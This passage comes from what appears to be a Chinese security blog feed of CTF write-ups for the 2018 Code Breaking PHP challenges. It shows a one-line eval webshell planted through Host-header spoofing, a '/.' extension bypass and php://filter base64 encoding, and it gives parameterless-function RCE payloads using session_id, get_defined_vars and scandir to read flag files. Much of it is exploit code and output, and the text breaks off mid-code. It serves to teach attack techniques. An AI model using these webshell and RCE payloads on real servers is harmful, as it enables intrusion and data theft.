escapeshellarg($domain));</span><br><span class="line">$output = shell_exec($command);</span><br><span class="line">$output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br></pre></td></tr></table></figure></p><p>然后将命令执行结果写入文件,并打印出来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;file_put_contents($log_name, $output); &#125;</span><br><span class="line">     <span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure></p><h2 id="攻击点探索"><a href="#攻击点探索" class="headerlink" title="攻击点探索"></a>攻击点探索</h2><p>这里不难顺着题目想到，此题应该是bypass拼接，进行我们想要的命令执行。<br>那么这里思路可以分为2种：<br>1.利用文件保存功能留一个shell<br>2.直接进行RCE，因为执行结果会打印出来<br>这里我比较趋向于第一种，因为第二种我们需要bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg()</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-13-23-26.png" alt=""><br>直接进行命令执行不是太方便，每次都要考虑Bypass的问题，而写一个Shell，只要bypass一次，一劳永逸。<br>同时更关键的一点，如果我们想走第二条路径，就要控制以下指令的返回值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br></pre></td></tr></table></figure></p><p>常见并列执行命令方式如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat sky.c &amp;&amp; ls</span><br></pre></td></tr></table></figure></p><p>但这里由于escapeshellarg()的存在，我们的输入变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -t A -q &apos;&amp;&amp; ls&apos;</span><br></pre></td></tr></table></figure></p><p>失去并列执行的意义,所以这里考虑第1条路径：写shell<br>想要写shell的话，还是会遇到几项问题：<br>1.控制写入路径<br>2.bypass 黑名单<br>3.控制写入内容</p><h2 id="控制写入路径"><a href="#控制写入路径" class="headerlink" title="控制写入路径"></a>控制写入路径</h2><p>如果想要控制写入路径，那么势必关注写入函数，其中可能带有危险操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($log_name, $output);</span><br></pre></td></tr></table></figure></p><p>对于<code>$log_name</code>我们可以跟踪到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br></pre></td></tr></table></figure></p><p>关于这项操作，我们发现文件路径会拼接<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]</span><br></pre></td></tr></table></figure></p><p>那么这个值是做什么的呢？我们查阅官方手册<br><img src="/images/2019-03-28-13-42-15.png" alt=""><br>官方手册中提示如果不设置 UseCanonicalName = On 和 ServerName，那么则可能被客户端进行伪造<br>我们不妨写如下脚本进行测试<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$log_name = $_GET[<span class="string">'log'</span>];</span><br><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"><span class="keyword">echo</span> $log_name;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-14-07-42.png" alt=""><br><img src="/images/2019-03-28-14-08-03.png" alt=""><br>可以看到<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>可用host去控制，那么这样一来，文件名可控</p><h2 id="bypass-黑名单"><a href="#bypass-黑名单" class="headerlink" title="bypass 黑名单"></a>bypass 黑名单</h2><p>我们关注到黑名单为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;]</span><br></pre></td></tr></table></figure></p><p>其实绕过手段还有不少，例如<code>phps</code>,但是目标会不会解析是个问题<br>有没有更加万能的bypass手段呢？<br>我们注意到获取后缀的方式为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pathinfo($log_name, PATHINFO_EXTENSION)</span><br></pre></td></tr></table></figure></p><p>而<code>pathinfo()</code>是有漏洞的<br>我们不妨做如下测试<br><img src="/images/2019-03-28-14-16-28.png" alt=""><br><code>pathinfo()</code>只会单一的去获取最后一个<code>.</code>后的值作为后缀名<br>那么在php后加上<code>.</code>是否还能正常访问呢？<br>我们不妨做如下测试<br><img src="/images/2019-03-28-14-18-18.png" alt=""><br>答案是否定的.<br>那么还有没有其他方法呢？<br>我们测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@sky# php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; file_put_contents(&apos;/tmp/sky.php/.&apos;, &apos;12345&apos;);</span><br><span class="line">php &gt; exit</span><br><span class="line"></span><br><span class="line">root@sky# ls /tmp | grep sky</span><br><span class="line">sky.php</span><br></pre></td></tr></table></figure></p><p>发现成功写入<code>/tmp/sky.php</code>，同时bypass了pathinfo()的黑名单<br><img src="/images/2019-03-28-14-23-16.png" alt=""><br>至于为什么<code>/.</code>可以进行bypass，可参考下述文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wonderkun.cc/index.html/?p=626</span><br></pre></td></tr></table></figure></p><h2 id="控制写入内容"><a href="#控制写入内容" class="headerlink" title="控制写入内容"></a>控制写入内容</h2><p>可控路径，可Bypass后缀名，那么就只剩下内容写入了，我们需要bypass两个过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg($domain)</span><br><span class="line">htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES)</span><br></pre></td></tr></table></figure></p><p>这么显然如果不用编码的话，很难bypass过滤，毕竟符号会被过滤，例如<code>&lt;</code><br>那么如何使用编码写入呢?<br>这里就要从伪协议说起，我们知道有php有如下伪协议<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=sky.php”</span><br></pre></td></tr></table></figure></p><p>可以将内容进行base64解码再写入,那么我们只要再$domain中传入base64即可，这样即可轻松Bypass过滤<br>再配合上我们之前的路径Bypass可以得到如下payload进行测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host:php://filter/write=convert.base64-decode/resource=</span><br><span class="line">log=sky.php/.</span><br><span class="line">$domain = c2t5c2t5</span><br></pre></td></tr></table></figure></p><p>我们访问sky.php进行查看<br>这里需要注意，先去得到自己的<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code><br>这里方法很多，有很多提供ip的网站，或者可用自己的vps，这里不再赘述<br>可以计算得到我的沙盒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/d4dabdbc73b87e364e29e60c60a92900</span><br></pre></td></tr></table></figure></p><p>我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/d4dabdbc73b87e364e29e60c60a92900/sky.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-14-37-29.png" alt=""><br>我们发现之前发送的base64已经变成了skysky</p><h2 id="payload写入"><a href="#payload写入" class="headerlink" title="payload写入"></a>payload写入</h2><p>那么剩下的就是写入一句话木马了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'s'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX0dFVFsncyddKTsgPz4=</span><br></pre></td></tr></table></figure></p><p>这里需要注意base64不要带有<code>==</code>，因为我们插入的base64在文本中间<br><img src="/images/2019-03-28-14-33-09.png" alt=""><br>而<code>==</code>是出现在base64结尾的，会导致解码错误<br>所有我们把<code>=</code>换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX0dFVFsncyddKTsgPz4a</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-14-53-26.png" alt=""><br>我们进行测试<br><img src="/images/2019-03-28-14-46-00.png" alt=""><br>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/data/d4dabdbc73b87e364e29e60c60a92900/res.php?s=var_dump(scandir(&apos;./&apos;));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-14-54-34.png" alt=""><br>继续上跳<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/data/d4dabdbc73b87e364e29e60c60a92900/res.php?s=var_dump(scandir(%27../../../%27));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-14-55-29.png" alt=""><br>发现flag，我们读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/data/d4dabdbc73b87e364e29e60c60a92900/res.php?s=readfile(%27../../../flag_phpmag1c_ur1%27);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-28-14-56-29.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道题并不难，主要涉及几个php trick:<br>1.<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>可通过Host进行伪造<br>2.<code>/.</code>可用来bypass文件后缀黑名单<br>3.php伪协议可用来base64 bypass写入内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于合天智汇</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前些日子有些忙，没有继续做，现在跟进，先看下之前做的几道题：&lt;br&gt;2018 Code Breaking(1) &amp;amp; function
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 Code Breaking(3) &amp; phplimit</title>
    <link href="http://skysec.top/2019/03/10/2018-Code-Breaking-3-phplimit/"/>
    <id>http://skysec.top/2019/03/10/2018-Code-Breaking-3-phplimit/</id>
    <published>2019-03-10T04:59:13.000Z</published>
    <updated>2019-03-29T04:52:16.882Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次是phplimit这道题，本篇文章提供了3种解法，即如何利用无参数函数进行RCE/任意文件读取</p><h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>题目源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>代码非常清晰，首先<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])</span><br></pre></td></tr></table></figure></p><p>代码会将<code>$_GET[&#39;code&#39;]</code>中满足正则<code>/[^\W]+\((?R)?\)/</code>的部分，替换为空，然后查看是否剩下的部分强等于<code>;</code><br>如果满足，则执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure></p><p>否则什么都不做。那么思路很明确，我们弄清楚正则即可进行RCE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\)</span><br></pre></td></tr></table></figure></p><p>首先是<code>[^\W]</code><br>对于<code>\W</code>,其意思等价于<code>[^A-Za-z0-9_]</code>。<br>那么我们知道，我们的input必须以此开头<br>然后是括号匹配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\( ...... \)</span><br></pre></td></tr></table></figure></p><p>括号中间为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?R)?</span><br></pre></td></tr></table></figure></p><p>意思为重复整个模式<br>简单理解，我们可以输入以下类型<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(b(c()))</span><br></pre></td></tr></table></figure></p><p>但我们不能加参数,否则将无法匹配<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a(c,d)</span><br></pre></td></tr></table></figure></p><p>所以正则看完，题目的意思非常明确了：<br>我们只能input函数，但函数中不能使用参数，否则判断句右边经过替换，将不止剩余分号<code>;</code></p><h2 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h2><p>那么有没有办法通过无参数函数，达到RCE的目的呢？答案显然是不可能的，没有参数，怎么传递我们需要执行的指令呢？<br>所以我们的目标也变得很明确：通过某种无参数函数获取指定位置的变量value，达到RCE的目的。<br>那么哪里有我们可以控制的变量，并且还能通过无参数函数获取到呢？<br>那么思路又变得清晰了，http header就是我们的突破口。我们可以更改header中的各项属性，以及其value。<br>那么有没有函数可以函数http header呢？<br>我们在php手册中直接搜索<br><img src="/images/2019-03-10-13-30-09.png" alt=""><br>能用的手段很多，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()</span><br><span class="line">file_get_contents(array_pop(apache_request_headers()))</span><br></pre></td></tr></table></figure></p><p>但如果我们测试的话，会发现均不可用，因为其为Apache函数<br>但我们看当前题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: nginx/1.15.9</span><br><span class="line">&lt; Date: Sun, 10 Mar 2019 05:24:56 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: PHP/5.6.40</span><br><span class="line">&lt;</span><br></pre></td></tr></table></figure></p><p>其是nginx，所以之前的方式均无效了。</p><h2 id="寻找nginx函数"><a href="#寻找nginx函数" class="headerlink" title="寻找nginx函数"></a>寻找nginx函数</h2><p>那么现在思路又进一步变为：寻找nginx函数，以获取http headers<br>查阅php手册，并未发现相关可利用函数，于是此路终止。<br>那不能获取http headers怎么办？我们又该如何进行参数的传递？<br>这里我们可以转换一下思路，之间获取http headers，我们能获取非常多的属性，也就是说我们的可修改位置非常多，相当于一个面。但其实我们只要能够获取，并修改1条属性就够了，例如cookie或是X-Forward-For等等……<br>这样就相当于从寻找一个面变成寻找一个点，难以程度就会大幅下降。<br>那么最容易想到的应该就是cookie了</p><h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><p>我们在php手册中，搜索cookie<br><img src="/images/2019-03-10-13-44-40.png" alt=""><br>我们点入session中，可以发现这样一个函数<br><img src="/images/2019-03-10-13-45-14.png" alt=""><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id ([ string $id ] ) : string</span><br></pre></td></tr></table></figure></p><p>session_id() 可以用来获取/设置当前会话 ID。<br>那么我们可以用此方法来获取phpsessionid，并且phpsessionid可控<br>但其有限制如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</span><br></pre></td></tr></table></figure></p><p>但问题不大，实际上我们只要拥有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0-9,a-f</span><br></pre></td></tr></table></figure></p><p>就够了，因为我们可以将16进制转字符串，例如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="keyword">print</span> <span class="string">'echo "sky cool";'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="number">6563686</span>f2022736b7920636f6f6c223b</span><br><span class="line">php &gt; <span class="keyword">eval</span>(hex2bin(<span class="string">'6563686f2022736b7920636f6f6c223b'</span>));</span><br><span class="line">sky cool</span><br></pre></td></tr></table></figure></p><p>我们可以看到，成功的执行命令<br>也就是说，我们只要使用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(hex2bin(session_id()));</span><br></pre></td></tr></table></figure></p><p>即可执行任意命令<br>但是当前题目并没有开启<code>session_start()</code><br>所以我们这里输入如下即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin(session_id(session_start()))</span><br></pre></td></tr></table></figure></p><p>我们编写脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://localhost/?code=eval(hex2bin(session_id(session_start())));'</span></span><br><span class="line">payload = <span class="string">"echo 'sky cool';"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">cookies = &#123;</span><br><span class="line"><span class="string">'PHPSESSID'</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-10-14-00-08.png" alt=""><br>那么下面就是找flag即可<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"var_dump(scandir('./'));"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"index.php"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"var_dump(scandir('../'));"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"."</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">2</span>) <span class="string">".."</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  string(<span class="number">14</span>) <span class="string">"flag_phpbyp4ss"</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"html"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"var_dump(file_get_contents('../flag_phpbyp4ss'));"</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">string(<span class="number">38</span>) <span class="string">"flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;"</span></span><br></pre></td></tr></table></figure></p><p>最后可以成功getflag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><p>我们通过php session的控制，达成了RCE的目的，那么我们有没有其他类似的方法呢？<br>答案是肯定的，我们还可以通过我们传递的参数来进行RCE<br>有如下函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()</span><br></pre></td></tr></table></figure></p><p>此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br>我们测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?code=var_dump(get_defined_vars());&amp;a=2</span><br></pre></td></tr></table></figure></p><p>得到回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [&quot;_GET&quot;]=&gt; array(2) &#123; [&quot;code&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; [&quot;a&quot;]=&gt; string(1) &quot;2&quot; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; &#125;</span><br></pre></td></tr></table></figure></p><p>那么如何将里面的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;a&quot;]=&gt; string(1) &quot;2&quot;</span><br></pre></td></tr></table></figure></p><p>提取出来呢？<br><img src="/images/2019-03-10-14-10-25.png" alt=""><br>这里有一系列提取位置的函数，我们首先使用<code>current()</code>函数<br>得到回显<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(current(get_defined_vars()));&amp;a=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="string">"code"</span>]=&gt; string(<span class="number">38</span>) <span class="string">"var_dump(current(get_defined_vars()));"</span> [<span class="string">"a"</span>]=&gt; string(<span class="number">1</span>) <span class="string">"2"</span> &#125;</span><br></pre></td></tr></table></figure></p><p>我们再取这个数组的最后一个<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(end(current(get_defined_vars())));&amp;a=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">string(<span class="number">1</span>) <span class="string">"2"</span></span><br></pre></td></tr></table></figure></p><p>即得到了回显。<br>那么后面就比较简单了，控制a进行RCE即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo();</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-03-10-14-12-57.png" alt=""><br>然后getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get_defined_vars())));&amp;a=readfile(%27../flag_phpbyp4ss%27);</span><br></pre></td></tr></table></figure></p><p>即可拿到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e86963ba34687d269b9faf526ce68cd7&#125;</span><br></pre></td></tr></table></figure></p><h2 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h2><p>为什么一定要RCE呢？这个题既然flag放在文件里，我们能不能直接读文件就行？<br>之前的方法都基于可以进行RCE，可以说我们是把题目难度又加大了，实际上，我们只进行任意文件读取即可<br>那么想读文件，就必须进行目录遍历，没有参数，怎么进行目录遍历呢？<br>首先，我们可以利用<code>getcwd()</code>获取当前目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(getcwd());</span><br><span class="line"></span><br><span class="line">string(13) &quot;/var/www/html&quot;</span><br></pre></td></tr></table></figure></p><p>那么怎么进行当前目录的目录遍历呢？<br>这里用<code>scandir()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>那么既然不在这一层目录，如何进行目录上跳呢？<br>我们用<code>dirname()</code>即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(14) &quot;flag_phpbyp4ss&quot; [3]=&gt; string(4) &quot;html&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>即可发现flag文件，那么问题又回到之前，如果取数组指定位置的值，我们需要取的位置是第3个，我们有的方法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">current() 取第一个</span><br><span class="line">next() 取第二个</span><br><span class="line">end() 取最后一个</span><br></pre></td></tr></table></figure></p><p>那么怎么取第三个呢？<br>我们这里让数组倒叙，然后取第二个即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(next(array_reverse(scandir(dirname(getcwd())))));</span><br><span class="line"></span><br><span class="line">string(14) &quot;flag_phpbyp4ss&quot;</span><br></pre></td></tr></table></figure></p><p>那么读文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 